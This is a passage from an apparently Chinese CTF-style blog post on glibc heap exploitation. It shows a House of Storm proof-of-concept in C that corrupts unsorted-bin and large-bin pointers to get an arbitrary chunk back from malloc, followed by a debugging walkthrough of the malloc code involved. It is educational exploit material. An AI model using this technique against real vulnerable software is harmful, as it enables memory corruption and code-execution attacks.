class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">POC for House of Storm on 2.23</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">For 2.26-2.28, the tcache will need to</span></span><br><span class="line"><span class="comment">be full for this to work. After this,</span></span><br><span class="line"><span class="comment">a patch to the unsorted bin attack likely prevents this</span></span><br><span class="line"><span class="comment">technique from working.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This technique uses a combination of editing</span></span><br><span class="line"><span class="comment">the unsorted bin chunk and the large bin chunks</span></span><br><span class="line"><span class="comment">to write a &#x27;size&#x27; to a user choosen address in memory.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Once this has occurred, if the size at this &#x27;fake&#x27;</span></span><br><span class="line"><span class="comment">location is the same size as the allocation,</span></span><br><span class="line"><span class="comment">then the chunk will be returned back to the user.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This attack allows arbitrary chunks to be returned</span></span><br><span class="line"><span class="comment">to the user!</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Written by Maxwell &quot;Strikeout&quot; Dulin</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">        <span class="comment">// clearenv();</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get the AMOUNT to shift over for size and the offset on the largebin.</span></span><br><span class="line"><span class="comment">// Needs to be a valid minimum sized chunk in order to work.</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">get_shift_amount</span><span class="params">(<span class="type">char</span>* pointer)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> shift_amount = <span class="number">0</span>;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ptr = (<span class="type">long</span> <span class="type">long</span>)pointer;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr &gt; <span class="number">0x20</span>)&#123;</span><br><span class="line">                ptr = ptr &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                shift_amount += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> shift_amount - <span class="number">1</span>; <span class="comment">// Want amount PRIOR to this being zeroed out</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> *unsorted_bin, *large_bin, *fake_chunk, *ptr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;House of Storm&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;======================================&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Preparing chunks for the exploit&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Put one chunk into unsorted bin and the other into the large bin&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The unsorted bin chunk MUST be larger than the large bin chunk.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Putting a chunk into the unsorted bin and another</span></span><br><span class="line"><span class="comment">	into the large bin.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span> ( <span class="number">0x4e8</span> );  <span class="comment">// size 0x4f0</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Find the proper chunk size to allocate.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Must be exactly the size of the written chunk from above.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	Find the proper size to allocate</span></span><br><span class="line"><span class="comment">	We are using the first &#x27;X&#x27; bytes of the heap to act</span></span><br><span class="line"><span class="comment">	as the &#x27;size&#x27; of a chunk. Then, we need to allocate a</span></span><br><span class="line"><span class="comment">	chunk exactly this size for the attack to work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, in order to do this, we have to take the higher</span></span><br><span class="line"><span class="comment">	bits of the heap address and allocate a chunk of this</span></span><br><span class="line"><span class="comment">	size, which comes from the upper bytes of the heap address.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	<span class="doctag">NOTE:</span></span></span><br><span class="line"><span class="comment">	- This does have a 1/2 chance of failing. If the 4th bit</span></span><br><span class="line"><span class="comment">	of this value is set, then the size comparison will fail.</span></span><br><span class="line"><span class="comment">	- Without this calculation, this COULD be brute forced.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="type">int</span> shift_amount = <span class="built_in">get_shift_amount</span>(unsorted_bin);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Shift Amount: %d\n&quot;</span>, shift_amount);</span><br><span class="line"></span><br><span class="line">        <span class="type">size_t</span> alloc_size = ((<span class="type">size_t</span>)unsorted_bin) &gt;&gt; (<span class="number">8</span> * shift_amount);</span><br><span class="line">        <span class="keyword">if</span>(alloc_size &lt; <span class="number">0x10</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Chunk Size: 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Chunk size is too small&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        alloc_size = (alloc_size &amp; <span class="number">0xFFFFFFFFE</span>) - <span class="number">0x10</span>; <span class="comment">// Remove the size bits</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;In this case, the chunk size is 0x%lx\n&quot;</span>, alloc_size);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Checks to see if the program will crash or not</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        The fourth bit of the size and the &#x27;non-main arena&#x27; chunk can NOT be set. Otherwise, the chunk. So, we MUST check for this first. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        Additionally, the code at https://elixir.bootlin.com/glibc/glibc-2.27/source/malloc/malloc.c#L3438</span></span><br><span class="line"><span class="comment">        validates to see if ONE of the following cases is true:</span></span><br><span class="line"><span class="comment">        - av == arena_for_chunk (mem2chunk (mem))</span></span><br><span class="line"><span class="comment">        - chunk is mmaped</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        If the &#x27;non-main arena&#x27; bit is set on the chunk, then the</span></span><br><span class="line"><span class="comment">        first case will fail.</span></span><br><span class="line"><span class="comment">        If the mmap bit is set, then this will pass.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        So, either the arenas need to match up (our fake chunk is in the</span></span><br><span class="line"><span class="comment">        .bss section for this demo. So, clearly, this will not happen) OR</span></span><br><span class="line"><span class="comment">        the mmap bit must be set.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        The logic below validates that the fourth bit of the size</span></span><br><span class="line"><span class="comment">        is NOT set and that either the mmap bit is set or the non-main</span></span><br><span class="line"><span class="comment">        arena bit is NOT set. If this is the case, the exploit should work.</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span>((alloc_size &amp; <span class="number">0x8</span>) != <span class="number">0</span> || (((alloc_size &amp; <span class="number">0x4</span>) == <span class="number">0x4</span>) &amp;&amp; ((alloc_size &amp; <span class="number">0x2</span>) != <span class="number">0x2</span>)))&#123;</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Allocation size has bit 4 of the size set or &quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;mmap and non-main arena bit check will fail&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Please try again! :)&quot;</span>);</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;Exiting...&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	large_bin  =  <span class="built_in">malloc</span> ( <span class="number">0x4d8</span> );  <span class="comment">// size 0x4e0</span></span><br><span class="line">	<span class="comment">// prevent merging</span></span><br><span class="line">	<span class="built_in">malloc</span> ( <span class="number">0x18</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// FIFO</span></span><br><span class="line">	<span class="built_in">free</span> ( large_bin );  <span class="comment">// put small chunks first</span></span><br><span class="line">	<span class="built_in">free</span> ( unsorted_bin );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Put the &#x27;large bin&#x27; chunk into the large bin</span></span><br><span class="line">	unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x4e8</span>);</span><br><span class="line">	<span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, there is a single chunk in the</span></span><br><span class="line"><span class="comment">	large bin and a single chunk in the unsorted bin.</span></span><br><span class="line"><span class="comment">	It should be noted that the unsorted bin chunk</span></span><br><span class="line"><span class="comment">	should be LARGER in size than the large bin chunk</span></span><br><span class="line"><span class="comment">	but should still be within the same bin.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	In this setup, the large_bin has a chunk</span></span><br><span class="line"><span class="comment">	of size 0x4e0 and the unsorted bin</span></span><br><span class="line"><span class="comment">	has a chunk of size 0x4f0. This technique relies on</span></span><br><span class="line"><span class="comment">	the unsorted bin chunk being added to the same bin</span></span><br><span class="line"><span class="comment">	but a larger chunk size. So, careful heap feng shui</span></span><br><span class="line"><span class="comment">	must be done.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// The address that we want to write to!</span></span><br><span class="line">	fake_chunk = target - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability! Overwrite unsorted bins &#x27;bk&#x27; pointer with our target location.\n This is our target location to get from the allocator&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	The address of our fake chunk is set to the unsorted bin</span></span><br><span class="line"><span class="comment">	chunks &#x27;bk&#x27; pointer.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This launches the &#x27;unsorted_bin&#x27; attack but it is NOT the</span></span><br><span class="line"><span class="comment">	main purpose of us doing this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	After launching the &#x27;unsorted_bin attack&#x27; the &#x27;victim&#x27; pointer</span></span><br><span class="line"><span class="comment">	will be set to THIS address. Our goal is to find a way to get</span></span><br><span class="line"><span class="comment">	this address from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Vulnerability!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Only needs to be a valid address.</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Later on, we will use WRITE-WHERE primitive in the large bin to write a heap pointer to the location&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;of your fake chunk.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Misalign the location in order to use the primitive as a SIZE value.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;The &#x27;offset&#x27; changes depending on if the binary is PIE (5) or not PIE (2).&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Vulnerability #2!&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Overwrite large bins bk-&gt;nextsize with the address to put our fake chunk size at.&quot;</span>);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	This can be seen as a WRITE-WHERE primitive in the large bin.</span></span><br><span class="line"><span class="comment">	However, we are going to write a &#x27;size&#x27; for our fake chunk using this.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	So, we set https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3579</span></span><br><span class="line"><span class="comment">	to an address for our fake size. The write above (bk_nextsize) is</span></span><br><span class="line"><span class="comment">	controlled via the pointer we are going to overwrite below. The</span></span><br><span class="line"><span class="comment">	value that gets written is a heap address; the unsorted bin</span></span><br><span class="line"><span class="comment">	chunk address above.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The &#x27;key&#x27; to this is the offset. First, we subtract 0x18 because</span></span><br><span class="line"><span class="comment">	this is the offset to writting to fd_nextsize in the code shown</span></span><br><span class="line"><span class="comment">	above. Secondly, notice the -2 below. We are going</span></span><br><span class="line"><span class="comment">	to write a &#x27;heap address&#x27; at a mis-aligned location and</span></span><br><span class="line"><span class="comment">	use THIS as the size. For instance, if the heap address is 0x123456</span></span><br><span class="line"><span class="comment">	and the pointer is set to 0x60006. This will write the following way:</span></span><br><span class="line"><span class="comment">	- 0x60006: 0x56</span></span><br><span class="line"><span class="comment">	- 0x60007: 0x34</span></span><br><span class="line"><span class="comment">	- 0x60008: 0x12</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Now, our &#x27;fake size&#x27; is at 0x60008 and is a valid size for the</span></span><br><span class="line"><span class="comment">	fake chunk at 0x60008. The fake size is CRUCIAL to getting this fake chunk</span></span><br><span class="line"><span class="comment">	from the allocator.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	Second vulnerability!!!</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	At this point, we&#x27;ve corrupted everything in just the right</span></span><br><span class="line"><span class="comment">	way so this should work.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	The purpose of the attack is to have a corrupted &#x27;bk&#x27; pointer</span></span><br><span class="line"><span class="comment">	point to ANYWHERE we want and still get the memory back. We do</span></span><br><span class="line"><span class="comment">	this by using the large bin code to write a size to the &#x27;bk&#x27;</span></span><br><span class="line"><span class="comment">	location.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">	This call to malloc (if you&#x27;re lucky), will return a pointer</span></span><br><span class="line"><span class="comment">	to the fake chunk that we created above.</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Make allocation of the size that the value will be written for.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once the allocation happens, the madness begins&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Once in the unsorted bin, the &#x27;large bin&#x27; chunk will be used in orer to &quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;write a fake &#x27;size&#x27; value to the location of our target.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;After this, the target will have a valid size.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Next, the unsorted bin will see that the chunk (in unsorted_bin-&gt;bk) has a valid&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;size and remove it from the bin.&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;With this, we have pulled out an arbitrary chunk!&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String before: %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String pointer: %p\n&quot;</span>, target);</span><br><span class="line"></span><br><span class="line">	ptr = <span class="built_in">malloc</span>(alloc_size);</span><br><span class="line">	<span class="built_in">strncpy</span>(ptr, <span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47&quot;</span>, <span class="number">0x58</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;String after %s\n&quot;</span>, target);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Fake chunk ptr: %p\n&quot;</span>, ptr);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="调试-13"><a href="#调试-13" class="headerlink" title="调试"></a>调试</h3><p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194123520.png"
                      alt="image-20231010194123520"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194223371.png"
                      alt="image-20231010194223371"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194317515.png"
                      alt="image-20231010194317515"
                ></p>
<p>首先布置堆结构，<code>get_shift_amount()</code>函数计算 <code>fake_chunk_size</code> 偏移，这个偏移一般来说，开了 <code>PIE</code> 为 <code>5</code>，不开 <code>PIE</code> 为 <code>2</code>。<code>alloc_size</code> 在经过与 <code>0xffffffffffe(111111111111111111111111111111111110)</code>取与运算后，<code>PREV_INUSE</code>位将被置为<code>0</code>，然后减去 <code>0x10</code>后变为需要申请的用户大小<code>0x50</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010195052740.png"
                     
                ></p>
<p>这里判断 <code>alloc_size</code> 是否符合要求。与 <code>0x8(1000)</code> 取与运算不为 <code>0</code> 说明不是 <code>fast_chunk</code> 大小，不符合要求； 与 <code>0x4(0100)</code> 取与运算等于<code>0x4</code> 则说明 <code>NON_MAIN_ARENA </code> 位为 <code>1</code> ，不属于主堆区，不符合要求；与 <code>0x2(0010)</code> 取与运算不等于 <code>0x2(0010)</code> 则说明 <code>IS_MAPPED</code> 位不等于为 <code>1</code> ，符合要求（绕个弯子）。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200619889.png"
                      alt="image-20231010200619889"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200749723.png"
                      alt="image-20231010200749723"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200845852.png"
                      alt="image-20231010200845852"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201137929.png"
                      alt="image-20231010201137929"
                ></p>
<p>接下来申请 <code>largebin_chunk</code> ，并将<code>unsorted_bin</code> 和 <code>large_bin</code> 两个堆块都放入 <code>unsorted bin</code> 中。再次申请 <code>0x4e8</code> 大小堆块并释放，会将 <code>0x4e1</code> 大小的堆块放入 <code>large_bin</code>，将 <code>0x4f1</code> 大小的堆块放进 <code>unsorted bin</code>，满足 <code>unsortedbin_chunk &gt; largebin_chunk</code> 并且在大小在同一区域内。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201734234.png"
                      alt="image-20231010201734234"
                ></p>
<p>接下来完成任意地址申请，我们要控制 <code>target</code> 区域，在其 <code>fake_chunk=target-0x10</code> 位置申请。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">((<span class="type">size_t</span> *)unsorted_bin)[<span class="number">1</span>] = (<span class="type">size_t</span>)fake_chunk; <span class="comment">// unsorted_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin )[<span class="number">1</span>]  =  (<span class="type">size_t</span>)fake_chunk  +  <span class="number">8</span> ;  <span class="comment">// large_bin-&gt;bk</span></span><br><span class="line">(( <span class="type">size_t</span> *) large_bin)[<span class="number">3</span>] = (<span class="type">size_t</span>)fake_chunk - <span class="number">0x18</span> - shift_amount; <span class="comment">// large_bin-&gt;bk_nextsize</span></span><br></pre></td></tr></table></figure></div>

<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201942670.png"
                      alt="image-20231010201942670"
                ></p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010202458509.png"
                      alt="image-20231010202458509"
                ></p>
<p>构建如上图的堆结构，后面解释原因。</p>
<p>此时申请一个<code>0x50</code> 大小的堆块会经过以下两个变化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = unsorted_chunk-&gt;bk;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);<span class="comment">// bck==fake_chunk</span></span><br></pre></td></tr></table></figure></div>

<p>即 <code>unsorted_chunks(av)-&gt;bk = fake_chunk</code>;<code>fake_chunk+0x10(fake_chunk_fd) = unsorted_chunks(av)</code></p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* unsortedbin_chunks_size &gt; largebin_chunks_size 将执行如下代码 */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">      victim-&gt;fd_nextsize = fwd; <span class="comment">//victim==unsortedbin_chunk; fwd == largebin_chunk;</span></span><br><span class="line">      victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">      fwd-&gt;bk_nextsize = victim;</span><br><span class="line">      victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;</span><br><span class="line"></span><br><span class="line"><span class="built_in">mark_bin</span> (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure></div>

<p>然后执行如上代码，<code>unsorted_chunk_bk_nextsize</code> 首先指向 <code>fake_chunk-0x18-2</code> ，然后  <code>unsorted_chunk-&gt;bk_nextsize-&gt;fd_nextsize (fake_chunk-0x18-2+0x20)</code>  改为 <code>unsorted_chunk (此时fake_chunk的size被改为0x60)</code>。然后将 <code>bck(fake_chunk+0x8) </code>的 <code> fd(fake_chunk+0x8+0x10)</code> 指向 <code>unsorted_chunk</code>，伪造了 <code>fake_chunk_bk</code>。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010204701287.png"
                      alt="image-20231010204701287"
                ></p>
<p> 最后成功向目标位置写入内容。</p>
